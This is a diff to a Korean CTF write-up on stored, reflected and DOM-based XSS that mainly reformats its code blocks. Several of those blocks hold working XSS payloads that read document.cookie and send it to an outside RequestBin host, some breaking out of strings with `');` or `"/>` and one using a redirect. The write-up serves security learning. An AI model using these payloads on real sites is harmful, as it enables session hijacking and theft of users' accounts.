@@ -41,7 +41,6 @@ XSS 취약점에 `alert(1);` 대신 위와 같은 스크립트를 삽입하면 �
     }
   }
 </style>
-
 > <strong>DOM(Document Object Model)</strong>
 >
 >**DOM**은 HTML 문서를 계층적 트리 구조로 표현한 객체 기반의 인터페이스이다. 이 모델은 웹 브라우저가 문서 구조를 이해하고, JavaScript를 통해 문서의 구조·내용 등을 동적으로 조작할 수 있도록 지원한다.
@@ -75,30 +74,6 @@ XSS 취약점에 `alert(1);` 대신 위와 같은 스크립트를 삽입하면 �
 >             └── "paragraph"
 > ```
 > {: .dom-tree}
-
-> 여기는 냅두기용
-> <pre class="dom-html"><button class="copy-button"></button><code class="language-html" highlighted><data class="code-line" value="1"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
-> </data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
-> </data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
-> </data><data class="code-line" value="4" style="--indent: 4ch;">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
-> </data><data class="code-line" value="5" style="--indent: 2ch;">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
-> </data><data class="code-line" value="6" style="--indent: 2ch;">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
-> </data><data class="code-line" value="7" style="--indent: 4ch;">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>header<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
-> </data><data class="code-line" value="8" style="--indent: 4ch;">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>paragraph<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
-> </data><data class="code-line" value="9" style="--indent: 2ch;">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
-> </data><data class="code-line" value="10"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;
-> </data></code></pre>
-> <pre class="dom-tree"><button class="copy-button"></button><code class="language-text" highlighted><data class="code-line" value="1">document
-> </data><data class="code-line" value="2">└── html
-> </data><data class="code-line" value="3" style="--indent: 4ch;">    ├── head
-> </data><data class="code-line" value="4" style="--indent: 4ch;">    │   └── title
-> </data><data class="code-line" value="5" style="--indent: 4ch;">    │       └── <span class="hljs-string">"DOM"</span>
-> </data><data class="code-line" value="6" style="--indent: 4ch;">    └── body
-> </data><data class="code-line" value="7" style="--indent: 8ch;">        ├── h1
-> </data><data class="code-line" value="8" style="--indent: 8ch;">        │   └── <span class="hljs-string">"header"</span>
-> </data><data class="code-line" value="9" style="--indent: 8ch;">        └── p
-> </data><data class="code-line" value="10" style="--indent: 12ch;">            └── <span class="hljs-string">"paragraph"</span>
-> </data></code></pre>
 
 실제 웹 사이트에서의 예시를 통해 DOM-Based XSS의 동작 방식을 자세히 살펴보자.
 
@@ -154,12 +129,13 @@ HTML 인코딩은 간단하고 효과적인 XSS 방어 기법이지만, 상황�
 
 글 제목에 입력한 페이로드는 다음과 같다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-</data><data class="code-line" value="2" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="4" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-</data><data class="code-line" value="5"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;
-</data></code></pre>
+```html
+<script>
+  var cookieData = document.cookie;
+  var img = new Image();
+  img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
+</script>
+```
 
 앞서 살펴본 쿠키 탈취 스크립트와 동일한 형태이다. `img.src`에 지정된 URL은 수신된 HTTP 요청의 내용을 확인할 수 있도록 설정된 **RequestBin** 서비스의 **엔드포인트**이며, 해당 경로로 전송된 요청은 요청 시점의 사용자 쿠키 정보를 포함하게 된다.
 
@@ -200,12 +176,41 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 
 입력한 페이로드는 다음과 같다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-string">'</span>);
-</data><data class="code-line" value="2"><span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-</data><data class="code-line" value="3"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="4">img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-</data><data class="code-line" value="5">(<span class="hljs-string">'</span>
-</data></code></pre>
+```js
+');
+var cookieData = document.cookie;
+var img = new Image();
+img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
+('
+```
+<script>
+  (() => {
+    window.patchCodeLine = (lineNumber, override) => {
+      const code = document.currentScript.previousElementSibling.querySelector('pre code');
+
+      const patch = () => {
+        const line = code.querySelector(`.code-line[value="${lineNumber}"]`);
+        const lineContent = new DOMParser().parseFromString(override, 'text/html');
+
+        line.replaceChildren(...lineContent.body.childNodes);
+        line.appendChild(document.createTextNode('\n'));
+
+        observer.disconnect();
+      };
+
+      const observer = new MutationObserver(patch);
+
+      observer.observe(code, { attributes: true, attributeFilter: ['highlighted'] });
+
+      if (code.hasAttribute('highlighted')) patch();
+    };
+
+    patchCodeLine(1, [
+      '<span style="color:#032F62">\'</span>',
+      '<span style="color:#24292E">);</span>'
+    ].join(''));
+  })();
+</script>
 
 검색을 수행한 후 `<script>` 태그 내에 정상적으로 악성 스크립트가 포함된 것을 확인하였다.
 
@@ -238,14 +243,18 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 
 입력한 페이로드는 다음과 같다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-string">"</span>/&gt;
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
-</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-</data><data class="code-line" value="4" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="5" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-</data><data class="code-line" value="6"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-</data><data class="code-line" value="7">&lt;
-</data></code></pre>
+<style id="code-1">
+  #code-1 + pre data[value="7"] span {color: #24292E !important; font-style: normal !important;}
+</style>
+```html
+"/>
+<script>
+  var cookieData = document.cookie;
+  var img = new Image();
+  img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
+</script>
+<
+```
 
 `user` 파라미터를 변경한 후 `<script>` 태그의 내용을 확인해 보았다.
 
@@ -330,12 +339,19 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 
 입력한 페이로드는 다음과 같다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-string">'</span>);
-</data><data class="code-line" value="2"><span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-</data><data class="code-line" value="3"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="4">img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-</data><data class="code-line" value="5">(<span class="hljs-string">'</span>
-</data></code></pre>
+```js
+');
+var cookieData = document.cookie;
+var img = new Image();
+img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
+('
+```
+<script>
+  patchCodeLine(1, [
+    '<span style="color:#032F62">\'</span>',
+    '<span style="color:#24292E">);</span>'
+  ].join(''));
+</script>
 
 로그인 시도 후 `<script>` 태그의 내용에 정상적으로 악성 스크립트가 포함된 것을 확인하였다.
 
@@ -347,11 +363,18 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 
 이 문제를 해결하기 위해 페이로드를 다음과 같이 수정하였다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-string">'</span>);
-</data><data class="code-line" value="2"><span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-</data><data class="code-line" value="3"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-</data><data class="code-line" value="4">(<span class="hljs-string">'</span>
-</data></code></pre>
+```js
+');
+var cookieData = document.cookie;
+window.location.href = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
+('
+```
+<script>
+  patchCodeLine(1, [
+    '<span style="color:#032F62">\'</span>',
+    '<span style="color:#24292E">);</span>'
+  ].join(''));
+</script>
 
 `login.html`로의 리다이렉션 코드는 수정할 수 없으므로, 해당 스크립트보다 상위에 RequestBin 엔드포인트로의 리다이렉션 코드를 삽입하여 뒤의 코드를 무효화하는 방법을 선택하였다.
 
